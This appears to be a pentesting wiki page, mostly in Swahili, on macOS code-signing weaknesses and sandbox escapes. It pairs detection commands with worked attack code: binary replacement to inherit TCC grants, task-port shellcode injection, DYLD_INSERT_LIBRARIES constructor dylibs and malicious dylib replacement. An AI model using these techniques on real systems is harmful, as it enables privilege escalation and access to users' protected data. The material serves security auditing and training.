# macOS Code Signing Weaknesses & Sandbox Escapes

{{#include ../../../banners/hacktricks-training.md}}

## Ad-Hoc Signed Binaries

### Taarifa za Msingi

**Ad-hoc signing** (`CS_ADHOC`) hutoa saini ya msimbo bila **mnyororo wa cheti** — ni hash ya msimbo bila uthibitisho wa utambulisho wa msanidi programu. Asili ya binary haiwezi kufuatiliwa hadi msanidi programu au shirika lolote.

Kwenye Apple Silicon Macs, programu zote zinazotekelezeka zinahitaji angalau saini ya ad-hoc. Hii ina maana utapata saini za ad-hoc kwenye zana nyingi za maendeleo, vifurushi vya Homebrew, na utilities za wahusika wa tatu.

### Kwa Nini Hii Ni Muhimu

- **Hakuna utambulisho unaothibitishwa** — faili ya binari inaweza kubadilishwa bila kugunduliwa na ukaguzi unaotegemea utambulisho
- Ad-hoc binaries za wahusika wa tatu katika **nafasi zilizo na mamlaka** (FDA, daemon, helpers) ni malengo ya kipaumbele
- Katika baadhi ya usanidi, saini za ad-hoc zinaweza **zisithibitishwe kwa umakini** kama msimbo uliosainiwa na msanidi
- Binaries zilizosainishwa kwa ad-hoc ambazo zina **TCC grants** ni za thamani hasa — vibali hivyo hudumu hata kama yaliyomo kwenye binary yanabadilika (inategemea jinsi TCC ilivyofanya keying ya grant)

### Ugunduzi
```bash
# Find ad-hoc signed binaries
find /usr/local /opt /Applications -type f -perm +111 -exec sh -c '
flags=$(codesign -dvv "{}" 2>&1 | grep "CodeDirectory flags")
echo "$flags" | grep -q "adhoc" && echo "AD-HOC: {}"
' \; 2>/dev/null

# Check a specific binary
codesign -dv --verbose=4 /path/to/binary 2>&1 | grep -E "Signature|flags|Authority"
# Ad-hoc shows: "Signature=adhoc" and no Authority lines
```
### Shambulio: Binary Replacement
```bash
# If an ad-hoc signed daemon binary is in a writable location:
# 1. Check the binary's current capabilities
codesign -d --entitlements - /path/to/target 2>&1

# 2. Note its TCC grants in the database
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT service, auth_value FROM access WHERE client LIKE '%target%';"

# 3. Replace the binary (if location is writable)
cp /tmp/malicious-binary /path/to/target

# 4. Re-sign with ad-hoc signature (mimics the original)
codesign -s - /path/to/target

# 5. On next launch, the daemon runs your code with the original's TCC grants
# (This works when TCC keyed the grant by path rather than code signature)
```
---

## Mchakato Unaoweza Kudebug (get-task-allow)

### Taarifa za Msingi

The **`com.apple.security.get-task-allow`** entitlement (au `CS_GET_TASK_ALLOW` flag) inaruhusu mchakato wowote kujiunga kama debugger, kusoma kumbukumbu, kubadilisha rejista, kuingiza msimbo, na kudhibiti utekelezaji.

Hii imekusudiwa kwa ajili ya development builds pekee. Hata hivyo, baadhi ya binaries za watatu huambatana na entitlement hii katika production.

> [!CAUTION]
> Binary katika production yenye `get-task-allow` ni **mbinu ya haraka ya kutumia udhaifu**. Mchakato wowote wa ndani anaweza kuita `task_for_pid()`, kupata Mach task port ya lengo, na kuingiza msimbo wowote unaotekelezwa ukiwa na entitlements za lengo, TCC grants, na muktadha wa usalama.

### Ugunduzi
```bash
# Find debuggable binaries
find /Applications /usr/local -type f -perm +111 -exec sh -c '
codesign -d --entitlements - "{}" 2>&1 | grep -q "get-task-allow.*true" && echo "DEBUGGABLE: {}"
' \; 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT path, privileged FROM executables e
JOIN executable_capabilities ec ON e.id = ec.executable_id
JOIN capabilities c ON ec.capability_id = c.id
WHERE c.name = 'get_task_allow_signature'
ORDER BY e.privileged DESC;"
```
### Shambulio: Task Port Injection
```c
#include <mach/mach.h>
#include <mach/mach_vm.h>

// Get the target's task port (requires get-task-allow on target)
mach_port_t task;
kern_return_t kr = task_for_pid(mach_task_self(), target_pid, &task);

if (kr == KERN_SUCCESS) {
// Allocate memory in target process
mach_vm_address_t addr = 0;
mach_vm_allocate(task, &addr, shellcode_size, VM_FLAGS_ANYWHERE);

// Write shellcode into target
mach_vm_write(task, addr, (vm_offset_t)shellcode, shellcode_size);

// Make it executable
mach_vm_protect(task, addr, shellcode_size, FALSE,
VM_PROT_READ | VM_PROT_EXECUTE);

// Create a remote thread to execute the shellcode
// The shellcode runs with ALL of the target's entitlements and TCC grants
}
```
---

## Hakuna Library Validation + Mazingira ya DYLD

### Mchanganyiko Hatari

Wakati binary ina **zote mbili**:
- `com.apple.security.cs.disable-library-validation` (inapakia dylib yoyote)
- `com.apple.security.cs.allow-dyld-environment-variables` (inakubali DYLD env vars)

Hii ni **guaranteed code injection primitive** — `DYLD_INSERT_LIBRARIES` inafanya kazi kikamilifu.

### Ugunduzi
```bash
# Find binaries with the deadly combo
find /Applications -type f -perm +111 -exec sh -c '
ents=$(codesign -d --entitlements - "{}" 2>&1)
echo "$ents" | grep -q "disable-library-validation.*true" && \
echo "$ents" | grep -q "allow-dyld-environment.*true" && \
echo "INJECTABLE: {}"
' \; 2>/dev/null

# Using the scanner (both flags)
sqlite3 /tmp/executables.db "
SELECT path, privileged, tccPermsStr FROM executables
WHERE noLibVal = 1 AND allowDyldEnv = 1
ORDER BY privileged DESC;"
```
### Shambulio: DYLD_INSERT_LIBRARIES Injection
```bash
# 1. Create the injection dylib
cat > /tmp/inject.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor))
void injected(void) {
// This runs BEFORE main() in the target's process
// We inherit ALL of the target's:
// - Entitlements
// - TCC grants (camera, mic, FDA, etc.)
// - Sandbox exceptions
// - Mach port rights

FILE *f = fopen("/tmp/injected_proof.txt", "w");
fprintf(f, "Running as PID %d with target's privileges\n", getpid());
fclose(f);

// Example: if target has camera TCC, we can now capture video
// Example: if target has FDA, we can read any file
}
EOF

# 2. Compile the dylib
cc -shared -o /tmp/inject.dylib /tmp/inject.c

# 3. Inject into the target
DYLD_INSERT_LIBRARIES=/tmp/inject.dylib /path/to/noLibVal-dyldEnv-binary

# 4. Verify injection
cat /tmp/injected_proof.txt
```
---

## Sandbox Temporary Exceptions

### How They Weaken the Sandbox

Sandbox temporary exceptions (`com.apple.security.temporary-exception.*`) hufungua mashimo katika App Sandbox:

| Exception | Inaruhusu Nini |
|---|---|
| `temporary-exception.mach-lookup.global-name` | Kuunganisha na huduma za mfumo nzima za XPC/Mach |
| `temporary-exception.files.absolute-path.read-write` | Kusoma/kuandika mafaili nje ya app container |
| `temporary-exception.iokit-user-client-class` | Kufungua miunganisho ya user-client ya IOKit |
| `temporary-exception.shared-preference.read-only` | Kusoma preferences za apps nyingine |
| `temporary-exception.files.home-relative-path.read-write` | Kupata njia zinazohusiana na `~` |

### Mach-Lookup Exceptions = Sandbox Escape Primitive

Exception hatari zaidi ni **mach-lookup** — inamruhusu app iliyosandboxed kuzungumza na daemons zenye ruhusa za juu:
```bash
# Find apps with mach-lookup exceptions
find /Applications -name "*.app" -exec sh -c '
binary="$1/Contents/MacOS/$(defaults read "$1/Contents/Info.plist" CFBundleExecutable 2>/dev/null)"
[ -f "$binary" ] && {
ents=$(codesign -d --entitlements - "$binary" 2>&1)
echo "$ents" | grep -q "mach-lookup" && {
count=$(echo "$ents" | grep -c "mach-lookup")
echo "[$count exceptions] $(basename "$1")"
}
}
' _ {} \; 2>/dev/null | sort -rn
```
### Shambulio: Sandbox Escape via Mach-Lookup
```
1. Compromise sandboxed app (renderer exploit, malicious document, etc.)
2. Read entitlements to discover mach-lookup exceptions
3. For each reachable service:
a. Connect via NSXPCConnection
b. Discover the service's protocol (class-dump, strings)
c. Fuzz each exposed method
4. Find a vulnerability in a privileged daemon
5. Exploit → code execution in the daemon's context (outside sandbox)
```
---

## Ruhusa Binafsi za Apple

### Nini Zinavyokuwa

Ruhusa zinazokuwa na kiambishi awali `com.apple.private.*` hutoa ufikiaji kwa **API za ndani za Apple** ambazo hazijaandikwa au hazipatikani kwa waendelezaji wa tatu. Binaries za pihakati wa tatu zilizo na ruhusa binafsi zilizipata kupitia enterprise cert, MDM, au usambazaji usio wa App-Store.

### Ruhusa Binafsi Zenye Hatari

| Ruhusa | Uwezo |
|---|---|
| `com.apple.private.tcc.manager` | Soma na andika kamili katika database ya TCC |
| `com.apple.private.tcc.allow` | Ufikiaji wa huduma maalum za TCC |
| `com.apple.private.security.no-sandbox` | Endesha bila sandbox |
| `com.apple.private.iokit` | Ufikiaji wa moja kwa moja wa driver wa IOKit |
| `com.apple.private.kernel.\*` | Ufikiaji wa kiolesura cha kernel |
| `com.apple.private.xpc.launchd.job-label` | Sajili/dhibiti kazi za launchd |
| `com.apple.rootless.install` | Kuandika kwenye njia zilizolindwa na SIP |

### Ugunduzi
```bash
# Find third-party binaries with private entitlements
find /Applications /usr/local -type f -perm +111 -exec sh -c '
ents=$(codesign -d --entitlements - "{}" 2>&1)
echo "$ents" | grep -q "com.apple.private" && {
echo "=== {} ==="
echo "$ents" | grep "com.apple.private" | head -10
}
' \; 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT path FROM executables
WHERE privateEnts = 1 AND isAppleBin = 0
ORDER BY privileged DESC;"
```
---

## Profaili za Sandbox Maalum (SBPL)

### Zinavyokuwa

Binaries zinaweza kuja na **profaili za Sandbox maalum** zilizoandikwa kwa SBPL (Seatbelt Profile Language). Profaili hizi zinaweza kuwa kali zaidi AU **zinaweza kutoa ruhusa zaidi** kuliko App Sandbox ya chaguo-msingi.

### Kukagua Profaili za Sandbox Maalum
```bash
# Find custom sandbox profiles
find /Applications /System -name "*.sb" -o -name "*.sbpl" 2>/dev/null

# Dangerous SBPL rules to flag during audit:
# (allow file-write*)         — Write to ANY file
# (allow process-exec*)       — Execute ANY process
# (allow mach-lookup*)        — Connect to ANY Mach service
# (allow network*)            — Full network access
# (allow iokit*)              — Full IOKit access
# (allow file-read*)          — Read ANY file

# Example: Audit a sandbox profile for overly permissive rules
cat /path/to/custom.sb | grep "(allow" | sort -u
```
---

## Njia za Maktaba Zinazoweza Kuandikwa

### Maana Yake

Wakati binary inapopakia dynamic library kutoka kwenye njia ambayo mtumiaji wa sasa anaweza **kuandika**, maktaba inaweza kubadilishwa kuwa na msimbo hatarishi.

### Ugunduzi
```bash
# Using the scanner — find privileged binaries loading from writable paths
sqlite3 /tmp/executables.db "
SELECT e.path, e.privileged
FROM executables e
JOIN executable_capabilities ec ON e.id = ec.executable_id
JOIN capabilities c ON ec.capability_id = c.id
WHERE c.name = 'execs_writable_path'
ORDER BY e.privileged DESC
LIMIT 30;"

# Manual check: list library dependencies and check writability
otool -L /path/to/binary | awk '{print $1}' | while read lib; do
[ -f "$lib" ] && [ -w "$lib" ] && echo "WRITABLE: $lib"
done
```
### Shambulio: Dylib Replacement
```bash
# 1. Find the writable library
otool -L /path/to/target-daemon | grep "/usr/local\|/opt\|Library"

# 2. Back up the original
cp /path/to/writable.dylib /tmp/original.dylib

# 3. Create a replacement that re-exports the original
cat > /tmp/evil.c << 'EOF'
#include <stdio.h>
__attribute__((constructor))
void evil(void) {
system("id > /tmp/escalated.txt");
}
EOF
cc -shared -o /tmp/evil.dylib /tmp/evil.c \
-Wl,-reexport_library,/tmp/original.dylib

# 4. Replace the library
cp /tmp/evil.dylib /path/to/writable.dylib

# 5. When the daemon restarts, it loads the evil dylib with daemon privileges
```
## Marejeo

* [Apple Developer — Code Signing Guide](https://developer.apple.com/library/archive/technotes/tn2206/_index.html)
* [Apple Developer — App Sandbox](https://developer.apple.com/library/archive/documentation/Security/Conceptual/AppSandboxDesignGuide/AboutAppSandbox/AboutAppSandbox.html)
* [Apple Developer — Entitlements](https://developer.apple.com/documentation/bundleresources/entitlements)
* [The Evil Bit — clear-library-validation](https://theevilbit.github.io/posts/com.apple.private.security.clear-library-validation/)

{{#include ../../../banners/hacktricks-training.md}}
